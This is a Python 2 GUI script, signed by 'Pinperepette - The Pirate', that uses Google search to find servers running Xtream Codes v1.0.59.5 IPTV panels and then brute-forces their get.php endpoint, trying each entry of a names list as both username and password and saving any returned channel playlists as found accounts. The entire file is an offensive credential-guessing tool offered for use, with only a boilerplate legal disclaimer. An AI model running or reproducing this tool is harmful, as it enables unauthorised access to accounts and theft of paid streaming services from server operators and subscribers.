#!/usr/bin/python
#-*- coding: utf-8 -*-

#########################################################################
#  This program is free software; you can redistribute it and/or modify #
#  it under the terms of the GNU General Public License as published by #
#  the Free Software Foundation; either version 2 of the License, or    #
#  (at your option) any later version.                                  #
#                                                                       #
#  This program is distributed in the hope that it will be useful,      #
#  but WITHOUT ANY WARRANTY; without even the implied warranty of       #
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        #
#  GNU General Public License for more details.                         #
#                                                                       #
#  You should have received a copy of the GNU General Public License    #
#  along with this program; if not, write to the Free Software          #
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,           #
#  MA 02110-1301, USA.                                                  #
############################# DISCALIMER ################################
#  Usage of this software for probing/attacking targets without prior   #
#  mutual consent, is illegal. It's the end user's responsability to    #
#  obey alla applicable local laws. Developers assume no liability and  #
#  are not responible for any missue or damage caused by thi program    #
#########################################################################

#by Pinperepette - The Pirate

from Tkinter import *
from tkMessageBox import *
import urllib2, google, time, pyprind , sys, os
from urlparse import urlparse
from sys import argv as s

#Parameters
search = "Xtream Codes v1.0.59.5"
names = "names.txt"
directory = "output"

class Example(Frame):

    def __init__(self, parent):
        Frame.__init__(self, parent)

        self.parent = parent

        self.initUI()

    def initUI(self):
        self.parent.title("Listbox")
        self.pack(fill=BOTH, expand=1)


        link = []
        for url in google.search(search, num = 1000, stop = 1):
             parsed = urlparse(url)
             link.append(parsed.scheme + "://" + parsed.netloc)
        lb = Listbox(self)
        for i in link:
            lb.insert(END, i)
            lb.bind("<<ListboxSelect>>", self.onSelect)
            lb.pack(fill=BOTH, expand=0)
        self.var = StringVar()

        self.textBox1=Entry(font = '{MS Sans Serif} 10', textvariable=self.var)
        self.textBox1.place(relx=0.02, rely=0.84, relwidth=0.74, relheight=0.08)

        self.button1=Button(text='Action', command=self.button1Click)
        self.button1.place(relx=0.78, rely=0.83, relwidth=0.18, relheight=0.10)

    def button1Click(self):
        URL = self.textBox1.get()
        rows = open(names , "r")
        NR = len(rows.readlines())
        TT = (str(NR))
        n = NR
        bar = pyprind.ProgBar(n, title = " ", stream = 1, monitor = True)
        tr = 0
        with open(names) as f:
            content = f.readlines()
            for r in content:
                req = urllib2.Request( URL + "/get.php?username=%s&password=%s&type=m3u&output=mpegts" % (r.rstrip().lstrip(), r.rstrip().lstrip()))
                response = urllib2.urlopen(req)
                the_page = response.read()
                NR = (NR - 1)
                TM = (str(NR))
                bar.update()
            if len(the_page) > 0:
                tr = (tr + 1)
                new_path = directory + "/" + URL.replace("http://", "")
                if os.path.exists(new_path) is False:
                    os.makedirs(new_path)
                    out_file = open(str(new_path) + "/tv_channels_%s.m3u" % r.rstrip().lstrip(), "w")
                    out_file.write(the_page)
                    out_file.close()
            trov = (str(tr))
            trovati =  str("Accounts found: " + trov)
            self.labe1 = Label(self, text=0, textvariable=trovati)
            self.labe1.pack()

    def onSelect(self, val):

        sender = val.widget
        idx = sender.curselection()
        value = sender.get(idx)

        self.var.set(value)


def main():

    root=Tk()
    ex = Example(root)
    root.title('IPTV')
    root.iconbitmap('favicon.ico')
    root.resizable(width=FALSE, height=FALSE)
    root.geometry('500x250')
    root.mainloop()

if __name__ == '__main__':
    main()
